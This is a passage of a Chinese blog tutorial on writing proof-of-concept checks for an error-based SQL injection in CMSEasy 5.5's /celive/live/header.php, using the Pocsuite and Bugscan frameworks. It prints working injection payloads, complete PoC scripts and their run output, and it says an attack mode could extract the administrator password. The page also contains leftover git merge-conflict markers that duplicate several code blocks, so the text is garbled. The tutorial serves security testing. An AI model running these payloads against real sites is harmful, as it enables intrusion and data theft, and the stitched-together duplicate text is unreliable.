<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CmsEasyPoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">	    ...</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">	    ...</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(self, result)</span>:</span></span><br><span class="line">	    ...</span><br><span class="line">register(CmsEasyPoC)</span><br></pre></td></tr></table></figure>
<p>最上面是引入一些类库，中部是一个 PoC 的类，继承自 POCBase 类，类中有两个函数，<code>_verify</code> 和 <code>_attack</code> ,这两个分别是 verify 和 attack 模式的入口函数，然后还有一个用户自己定义的函数 <code>parse_result</code> , 用于统一输出。</p>
<p>下面是针对每个具体的部分的说明，其实在人家框架里面已经有详细说明了，我重复一下。</p>
<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br></pre></td></tr></table></figure>
<p>上面这些代码的意思是引入 pocsuite 的类库,当然你直接去按目录找肯定是找不到的，因为这个是老版本的 pocsuite 框架的目录结构，为了兼容老版本的就这么处理了。在加载的时候会自动将其替换成正确的路径。总结起来就一句话，人这么规定的你就这么写就对了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CmsEasyPoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'88979'</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = [<span class="string">'Medici.Yan'</span>]</span><br><span class="line">    vulDate = <span class="string">'2014-10-22'</span></span><br><span class="line">    createDate = <span class="string">'2015-12-28'</span></span><br><span class="line">    updateDate = <span class="string">'2015-12-28'</span></span><br><span class="line">    references = [<span class="string">'http://wooyun.org/bugs/wooyun-2010-070827'</span>]</span><br><span class="line">    name = <span class="string">'CMSEasy 5.5 /celive/live/header.php SQL注入漏洞 POC'</span></span><br><span class="line">    appPowerLink = <span class="string">'http://www.cmseasy.cn/'</span></span><br><span class="line">    appName = <span class="string">'CMSEasy'</span></span><br><span class="line">    appVersion = <span class="string">'5.5'</span></span><br><span class="line">    vulType = <span class="string">'SQL Injection'</span></span><br><span class="line">    desc = <span class="string">'''</span><br><span class="line">           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接</span><br><span class="line">           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。</span><br><span class="line">           此注入为报错注入，可以通过UpdateXML函数进行注入。</span><br><span class="line">    '''</span></span><br><span class="line">    samples = [<span class="string">''</span>]</span><br></pre></td></tr></table></figure>
<p>这一部分代码，用于填写一些基础信息，PoC 多的情况下很有用的。根据漏洞实际情况填写就行了。</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def _verify(self):</span><br><span class="line">    <span class="literal">result</span> = &#123;&#125;</span><br><span class="line">    target = self.url + '/celive/live/header.php'</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        'xajax': '<span class="type">LiveMessage</span>',</span><br><span class="line">        'xajaxargs[<span class="number">0</span>][name]': <span class="string">"1',(SELECT 1 FROM (select count(*),concat("</span></span><br><span class="line">                              <span class="string">"floor(rand(0)*2),(select md5(233)))a from "</span></span><br><span class="line">                              <span class="string">"information_schema.tables group by a)b),"</span></span><br><span class="line">                              <span class="string">"'','','','1','127.0.0.1','2') #"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 使用 requests 发送 post 请求</span></span><br><span class="line">    response = req.post(target, data=post_data, timeout=<span class="number">10</span>)</span><br><span class="line">    content = response.content</span><br><span class="line">    <span class="comment"># 这个 e165421110ba03099a1c0393373c5b43 就是 md5(233) 的值</span></span><br><span class="line">    <span class="keyword">if</span> 'e165421110ba03099a1c0393373c5b43' <span class="keyword">in</span> content:</span><br><span class="line">        <span class="literal">result</span> = &#123;'<span class="type">VerifyInfo</span>': &#123;&#125;&#125;</span><br><span class="line">        <span class="literal">result</span>['<span class="type">VerifyInfo</span>']['<span class="type">URL</span>'] = target</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.parse_result(<span class="literal">result</span>)</span><br></pre></td></tr></table></figure>
<p>这里就是具体的 verify 的代码了。如果你看过 代码 <code>2_2_2.py</code> ，那么这段代码对你来说并不是问题，与代码 <code>2_2_2.py</code> 不同的是，这里使用了 req 来发送数据，还有一处不同的就是输出不再是 print 了，而是将我们要输出的信息保存在了一个叫 result 的字典里面，然后再调用 parse_result 将其输出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self._verify()</span><br></pre></td></tr></table></figure>
<p>这里是 attack 模式的入口，这个是带有攻击性质的验证模式，也就是说，在这个函数里面，你可以直接注出管理员密码出来。相对于 <code>_verify</code> 来说，这个就稍微复杂了那么一丢丢。我偷了个懒不想写了，就让它返回 verify 了。</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def parse_result(self, <span class="literal">result</span>):</span><br><span class="line">    output = <span class="type">Output</span>(self)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">result</span>:</span><br><span class="line">        output.success(<span class="literal">result</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output.fail('<span class="type">Internet</span> <span class="type">Nothing</span> returned')</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>
<p>这个函数，是我自己定义的一个函数，有些人有问题，到底能不能自己定义函数，答案就是 能！记住，<code>_verify</code> 和 <code>_attack</code> 是入口，也就是框架要调用这两个函数，程序执行进来了以后，你想怎么调用就怎么调用。</p>
<p>关于这里面的代码，就是调用了框架输出的实例 Output 了而已。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">register</span><span class="params">(CmsEasyPoC)</span></span></span><br></pre></td></tr></table></figure>
<p>这是最后，也是比较容易忽视的地方，一定要注意在最后要调用 register 来注册你的 PoC 类，这样框架才知道你这个类是 PoC 类，就会去调用它。</p>
<h3 id="2-2-5_基于_Bugscan_框架">2.2.5 基于 Bugscan 框架</h3><p>讲完了 Pocsuite 现在就来说说怎么将我们的代码 <code>2_2_2.py</code> 改写成基于 Bugscan 框架的 PoC。</p>
>>>>>>> github/master
<p>Bugscan 框架要求所有的逻辑代码都必须是基于 Python 2.7 的标准库的，所以像 requests 这种第三方库就不能在这里使用了。</p>
<p>Bugscan 提供了一个自己 sdk 封装好的 HTTP 请求发送工具 miniCurl，经历过一次改版后又提供了 miniCurl2, curl2 相比其它类库最大的特点是支持 raw 类型数据，也就是说，你从 burpsuite 里面截到的包直接复制出来就能直接发送，这大大方便了安全人员编写 PoC ，然而我并不喜欢这种方式,后面会讲讲这个东西怎么用。</p>
<p>官方出了更好用的 curl2 所以 curl 我就不在这里讲了。关于 miniCurl2 的用法，详细看<a href="http://q.bugscan.net/t/749" target="_blank" rel="external">这里</a></p>
<p>代码 <code>2_2_4.py</code>:</p>
<<<<<<< HEAD
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># __author__ = &apos;Medici.Yan&apos;</span><br><span class="line"></span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def assign(service, arg):</span><br><span class="line">    if service == &quot;cmseasy&quot;:</span><br><span class="line">        return True, arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def audit(arg):</span><br><span class="line">    target = arg + &apos;/celive/live/header.php&apos;</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        &apos;xajax&apos;: &apos;LiveMessage&apos;,</span><br><span class="line">        &apos;xajaxargs[0][name]&apos;: &quot;1&apos;,(SELECT 1 FROM (select count(*),concat(&quot;</span><br><span class="line">                              &quot;floor(rand(0)*2),(select md5(233)))a from &quot;</span><br><span class="line">                              &quot;information_schema.tables group by a)b),&quot;</span><br><span class="line">                              &quot;&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    code, head, body, errcode, redirect_url = curl.curl2(</span><br><span class="line">        target, post=urllib.urlencode(post_data))</span><br><span class="line">    if &apos;e165421110ba03099a1c0393373c5b43&apos; in body:</span><br><span class="line">        security_hole(target)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    from dummy import *</span><br><span class="line">    audit(assign(&apos;cmseasy&apos;, &apos;http://localhost/cmseasy/&apos;)[1])</span><br></pre></td></tr></table></figure>
<p>我们下载 Bugscan 官方 sdk 之后，将其解压，sdk 目录下有一个 dummy 目录，我们将 dummy 目录拷贝到和 <code>2_2_4.py</code> 在相同目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  2-2  ll</span><br><span class="line">total 24</span><br><span class="line">-rw-r--r--   1 medicean  staff   1.2K 12 28 10:54 2_2_2.py</span><br><span class="line">-rw-r--r--   1 medicean  staff   2.2K 12 28 14:23 2_2_3.py</span><br><span class="line">-rw-r--r--   1 medicean  staff   878B 12 28 14:23 2_2_4.py</span><br><span class="line">drwxr-xr-x@  5 medicean  staff   170B 10 27 18:30 dummy</span><br></pre></td></tr></table></figure>
<p>代码 <code>2_2_4.py</code> 中 <code>if __name__ == &#39;__main__&#39;:</code> 部分已经指定了我们待测试的目标地址。然后我们执行 <code>2_2_4.py</code>，看到如下结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  2-2  python 2_2_4.py</span><br><span class="line">[LOG] &lt;hole&gt; http://localhost/cmseasy//celive/live/header.php</span><br></pre></td></tr></table></figure>
<p>看到这个就是执行成功了。本地是以 log 形式输出的，这玩意在网页上就会以扫描报告形式输出的。</p>
<p>好吧我们直接看代码结构了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># __author__ = &apos;Medici.Yan&apos;</span><br><span class="line"></span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def assign(service, arg):</span><br><span class="line">    if service == &quot;cmseasy&quot;:</span><br><span class="line">        return True, arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def audit(arg):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    from dummy import *</span><br><span class="line">    audit(assign(&apos;cmseasy&apos;, &apos;http://localhost/cmseasy/&apos;)[1])</span><br></pre></td></tr></table></figure>
<p>整体结构就像上面说的那样，最上面，是引入自己要用到的标准库，<code>assign</code> 就是任务分配函数，是来判断本次扫描任务是否可以调用这个 PoC 的， <code>audit</code> 就是整个验证逻辑的入口了，最下面的 <code>if __name__ == &#39;__main__&#39;:</code> 这段代码是为了让你在本地测试用的。</p>
<p>好了，看下具体的部分吧。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def assign(service, arg):</span><br><span class="line">    if service == &quot;cmseasy&quot;:</span><br><span class="line">        return True, arg</span><br></pre></td></tr></table></figure>
<p>这就是 assign 部分的代码了，Bugscan 在扫描任务开始的时候，会先去识别组件是什么样的 CMS ,然后再调用相对应的 PoC 去检测是否有对应的漏洞，你想啊，你用一个 CmsEasy 特有的漏洞的 PoC 去验证 WordPress 搭的一个站, 你这不是搞笑嘛？大部分情况下都不会有啊。</p>
<p>service 就是这个指纹识别的结果，类型是个字符串。具体支持什么，你去看官方文档就好了。这里我们直接写 cmseasy ，看代码逻辑啊，如果我们的 service 识别出来是 cmseasy , 那么就返回一个列表 (True, arg) 这里的 arg 就是 url 了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def audit(arg):</span><br><span class="line">    target = arg + &apos;/celive/live/header.php&apos;</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        &apos;xajax&apos;: &apos;LiveMessage&apos;,</span><br><span class="line">        &apos;xajaxargs[0][name]&apos;: &quot;1&apos;,(SELECT 1 FROM (select count(*),concat(&quot;</span><br><span class="line">                              &quot;floor(rand(0)*2),(select md5(233)))a from &quot;</span><br><span class="line">                              &quot;information_schema.tables group by a)b),&quot;</span><br><span class="line">                              &quot;&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    code, head, body, errcode, redirect_url = curl.curl2(</span><br><span class="line">        target, post=urllib.urlencode(post_data))</span><br><span class="line">    if &apos;e165421110ba03099a1c0393373c5b43&apos; in body:</span><br><span class="line">        security_hole(target)</span><br></pre></td></tr></table></figure>
=======
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = 'Medici.Yan'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> service == <span class="string">"cmseasy"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span>, arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></span><br><span class="line">    target = arg + <span class="string">'/celive/live/header.php'</span></span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'xajax'</span>: <span class="string">'LiveMessage'</span>,</span><br><span class="line">        <span class="string">'xajaxargs[0][name]'</span>: <span class="string">"1',(SELECT 1 FROM (select count(*),concat("</span></span><br><span class="line">                              <span class="string">"floor(rand(0)*2),(select md5(233)))a from "</span></span><br><span class="line">                              <span class="string">"information_schema.tables group by a)b),"</span></span><br><span class="line">                              <span class="string">"'','','','1','127.0.0.1','2') #"</span></span><br><span class="line">    &#125;</span><br><span class="line">    code, head, body, errcode, redirect_url = curl.curl2(</span><br><span class="line">        target, post=urllib.urlencode(post_data))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'e165421110ba03099a1c0393373c5b43'</span> <span class="keyword">in</span> body:</span><br><span class="line">        security_hole(target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">from</span> dummy <span class="keyword">import</span> *</span><br><span class="line">    audit(assign(<span class="string">'cmseasy'</span>, <span class="string">'http://localhost/cmseasy/'</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>我们下载 Bugscan 官方 sdk 之后，将其解压，sdk 目录下有一个 dummy 目录，我们将 dummy 目录拷贝到和 <code>2_2_4.py</code> 在相同目录下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">2</span>-<span class="number">2</span>  ll</span><br><span class="line">total <span class="number">24</span></span><br><span class="line">-rw-r--r--   <span class="number">1</span> medicean  staff   <span class="number">1.2</span>K <span class="number">12</span> <span class="number">28</span> <span class="number">10</span>:<span class="number">54</span> <span class="number">2</span>_2_2.py</span><br><span class="line">-rw-r--r--   <span class="number">1</span> medicean  staff   <span class="number">2.2</span>K <span class="number">12</span> <span class="number">28</span> <span class="number">14</span>:<span class="number">23</span> <span class="number">2</span>_2_3.py</span><br><span class="line">-rw-r--r--   <span class="number">1</span> medicean  staff   <span class="number">878</span>B <span class="number">12</span> <span class="number">28</span> <span class="number">14</span>:<span class="number">23</span> <span class="number">2</span>_2_4.py</span><br><span class="line">drwxr-xr-x@  <span class="number">5</span> medicean  staff   <span class="number">170</span>B <span class="number">10</span> <span class="number">27</span> <span class="number">18</span>:<span class="number">30</span> dummy</span><br></pre></td></tr></table></figure>
<p>代码 <code>2_2_4.py</code> 中 <code>if __name__ == &#39;__main__&#39;:</code> 部分已经指定了我们待测试的目标地址。然后我们执行 <code>2_2_4.py</code>，看到如下结果：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">2</span>-<span class="number">2</span>  python <span class="number">2</span>_2_4.py</span><br><span class="line">[LOG] &lt;hole&gt; http:<span class="comment">//localhost/cmseasy//celive/live/header.php</span></span><br></pre></td></tr></table></figure>
<p>看到这个就是执行成功了。本地是以 log 形式输出的，这玩意在网页上就会以扫描报告形式输出的。</p>
<p>好吧我们直接看代码结构了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = 'Medici.Yan'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> service == <span class="string">"cmseasy"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span>, arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">from</span> dummy <span class="keyword">import</span> *</span><br><span class="line">    audit(assign(<span class="string">'cmseasy'</span>, <span class="string">'http://localhost/cmseasy/'</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>整体结构就像上面说的那样，最上面，是引入自己要用到的标准库，<code>assign</code> 就是任务分配函数，是来判断本次扫描任务是否可以调用这个 PoC 的， <code>audit</code> 就是整个验证逻辑的入口了，最下面的 <code>if __name__ == &#39;__main__&#39;:</code> 这段代码是为了让你在本地测试用的。</p>
<p>好了，看下具体的部分吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> service == <span class="string">"cmseasy"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span>, arg</span><br></pre></td></tr></table></figure>
<p>这就是 assign 部分的代码了，Bugscan 在扫描任务开始的时候，会先去识别组件是什么样的 CMS ,然后再调用相对应的 PoC 去检测是否有对应的漏洞，你想啊，你用一个 CmsEasy 特有的漏洞的 PoC 去验证 WordPress 搭的一个站, 你这不是搞笑嘛？大部分情况下都不会有啊。</p>
<p>service 就是这个指纹识别的结果，类型是个字符串。具体支持什么，你去看官方文档就好了。这里我们直接写 cmseasy ，看代码逻辑啊，如果我们的 service 识别出来是 cmseasy , 那么就返回一个列表 (True, arg) 这里的 arg 就是 url 了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></span><br><span class="line">    target = arg + <span class="string">'/celive/live/header.php'</span></span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'xajax'</span>: <span class="string">'LiveMessage'</span>,</span><br><span class="line">        <span class="string">'xajaxargs[0][name]'</span>: <span class="string">"1',(SELECT 1 FROM (select count(*),concat("</span></span><br><span class="line">                              <span class="string">"floor(rand(0)*2),(select md5(233)))a from "</span></span><br><span class="line">                              <span class="string">"information_schema.tables group by a)b),"</span></span><br><span class="line">                              <span class="string">"'','','','1','127.0.0.1','2') #"</span></span><br><span class="line">    &#125;</span><br><span class="line">    code, head, body, errcode, redirect_url = curl.curl2(</span><br><span class="line">        target, post=urllib.urlencode(post_data))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'e165421110ba03099a1c0393373c5b43'</span> <span class="keyword">in</span> body:</span><br><span class="line">        security_hole(target)</span><br></pre></td></tr></table></figure>
>>>>>>> github/master
<p>根据 main 里面的 <code>audit(assign(&#39;cmseasy&#39;, &#39;http://localhost/cmseasy/&#39;)[1])</code> 我们知道， audit 的 arg 参数就是初始的 url 。</p>
<p>呐，我已经不想解释了，你和代码 <code>2_2_2.py</code> 对比下吧。区别有两点，第一个就是发送数据使用了 curl.curl2, 这个的用法看<a href="http://q.bugscan.net/t/749" target="_blank" rel="external">官方说明</a> 然后就是输出不再是 print 而是调用了 security_hole 来输出我们想要输出的字符串。</p>
<blockquote>
<p>security_hole 是高危，在网页上显示红色</p>
<p>security_warning 是中危，黄色</p>
<p>security_info 低危，蓝色</p>
<p>security_note 信息收集，绿色</p>
</blockquote>
<p>好了，基于 Bugscan 框架的 PoC 编写也讲完了。</p>
<<<<<<< HEAD
<h3 id="2-2-6-总结"><a href="#2-2-6-总结" class="headerlink" title="2.2.6 总结"></a>2.2.6 总结</h3><p>本小节中主要讲了 基于报错的 SQL 注入 PoC 编写，也就是针对有回显的 SQL 注入，我们 PoC 模拟了浏览器提交数据的这一过程，我们判断是否存在漏洞的依据就是看返回页面的内容是否有我们预期的值。</p>
=======
<h3 id="2-2-6_总结">2.2.6 总结</h3><p>本小节中主要讲了 基于报错的 SQL 注入 PoC 编写，也就是针对有回显的 SQL 注入，我们 PoC 模拟了浏览器提交数据的这一过程，我们判断是否存在漏洞的依据就是看返回页面的内容是否有我们预期的值。</p>
>>>>>>> github/master
<p>这里要注意的就是，我们判断的凭据不是说我提交了 abcde 到目标服务器，目标返回一个 abcde 就可以了，而是要证明我们的代码执行了，所以可以提交 ASCII 码到服务器，如果返回了对应的字符，就证明了可以执行。而为了减少误报，本着概率的角度，我们要使用稍微长的一个随机字符串(一定要注意随机,比如一个很长的单词 Christmas 就不行，这种有意义的字符串出现的概率有些大)。</p>
<p>有 md5 函数时，我们就可以在 payload 中执行 md5 函数，如果没有，就使用 char(xx)组合的形式。</p>
<hr>
<blockquote>
<p>2015/12/29 感谢 喵小姐指正</p>
<p>2016/01/11 新增 sqli-labs 推荐</p>
</blockquote>
</span>
      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/PoC/" rel="tag">#PoC</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-prev post-nav-item">
            
              <a href="/2016/01/27/poc_coding_3/" rel="prev">PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 中篇)</a>
            
          </div>

          <div class="post-nav-next post-nav-item">
            
              <a href="/2015/12/26/poc_coding_1/" rel="next">PoC 编写指南(第 1 章 技能基础)</a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

 </div>

        

        
          <div class="comments" id="comments">
            
              <div class="ds-thread" data-thread-key="2015/12/27/poc_coding_2/"
                   data-title="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 上篇)" data-url="http://blog.evalbug.com/2015/12/27/poc_coding_2/">
              </div>
            
          </div>
        
      </div>

      
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
